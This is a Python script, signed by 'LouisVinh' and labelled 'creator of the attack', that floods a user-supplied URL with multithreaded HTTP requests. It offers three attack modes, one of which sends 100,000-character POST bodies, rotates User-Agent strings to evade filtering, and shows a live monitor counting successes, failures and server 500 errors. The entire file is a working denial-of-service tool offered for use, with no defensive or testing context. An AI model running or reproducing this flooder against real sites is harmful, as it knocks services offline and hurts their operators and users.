import requests
import threading
import random
import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
]

stats = {
    "success": 0,
    "fail": 0,
    "error_500": 0,
    "other": 0,
    "pps": 0
}
lock = threading.Lock()

def worker(url, duration, reqs_per_cycle, mode):
    session = requests.Session()
    end_time = time.time() + duration

    payload = {
        "user": "LouisVinh",
        "message": "X" * 100000  # Payload lớn
    }

    headers_base = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    while time.time() < end_time:
        start = time.time()
        local_success, local_fail, local_500, local_other = 0, 0, 0, 0

        for _ in range(reqs_per_cycle):
            headers = headers_base.copy()
            headers['User-Agent'] = random.choice(USER_AGENTS)

            try:
                if mode == "GET":
                    response = session.get(url, headers=headers, timeout=5)
                elif mode == "POST":
                    response = session.post(url, headers=headers, data={"data": "test"}, timeout=5)
                elif mode == "POST_LARGE":
                    response = session.post(url, headers=headers, data=payload, timeout=5)
                else:
                    continue

                code = response.status_code
                if code == 200:
                    local_success += 1
                elif code == 500:
                    local_500 += 1
                else:
                    local_other += 1
            except:
                local_fail += 1

        elapsed = time.time() - start
        pps = reqs_per_cycle / elapsed if elapsed > 0 else reqs_per_cycle

        with lock:
            stats["success"] += local_success
            stats["fail"] += local_fail
            stats["error_500"] += local_500
            stats["other"] += local_other
            stats["pps"] = pps

def monitor():
    while True:
        with lock:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{Fore.GREEN}
   █░░ █▀█ █░█ █ █▀ ▀█▀ █ █▀▄▀█ █▀
   █▄▄ █▄█ █▄█ █ ▄█ ░█░ █ █░▀░█ ▄█
{Style.RESET_ALL}
--------- LouisVinh | Live Monitor ---------
{Fore.GREEN}[+] Success     : {stats['success']}{Style.RESET_ALL}
{Fore.RED}[!] Fail        : {stats['fail']}{Style.RESET_ALL}
{Fore.YELLOW}[*] Server 500 : {stats['error_500']}{Style.RESET_ALL}
{Fore.CYAN}[*] Other Codes: {stats['other']}{Style.RESET_ALL}
{Fore.MAGENTA}[*] PPS         : {stats['pps']:.2f}{Style.RESET_ALL}
---------------------------------------------
""")
        time.sleep(1)

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.GREEN}
   █░░ █▀█ █░█ █ █▀ ▀█▀ █ █▀▄▀█ █▀
   █▄▄ █▄█ █▄█ █ ▄█ ░█░ █ █░▀░█ ▄█
{Style.RESET_ALL}
----------------------------------------------------
creator of the attack | BY LouisVinh
----------------------------------------------------
Attack Modes:
[1] GET (nhẹ)
[2] POST (vừa)
[3] POST PAYLOAD LỚN (mạnh)
""")

    url = input(f"{Fore.RED}Enter Link: {Style.RESET_ALL}").strip()
    duration = int(input(f"{Fore.RED}Enter Time (seconds): {Style.RESET_ALL}").strip())
    threads_count = int(input(f"{Fore.RED}Enter Threads: {Style.RESET_ALL}").strip())
    reqs_per_cycle = 50

    mode_input = input(f"{Fore.RED}Choose Mode (1/2/3): {Style.RESET_ALL}").strip()
    mode_map = {"1": "GET", "2": "POST", "3": "POST_LARGE"}
    mode = mode_map.get(mode_input, "GET")

    monitor_thread = threading.Thread(target=monitor, daemon=True)
    monitor_thread.start()

    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(url, duration, reqs_per_cycle, mode))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()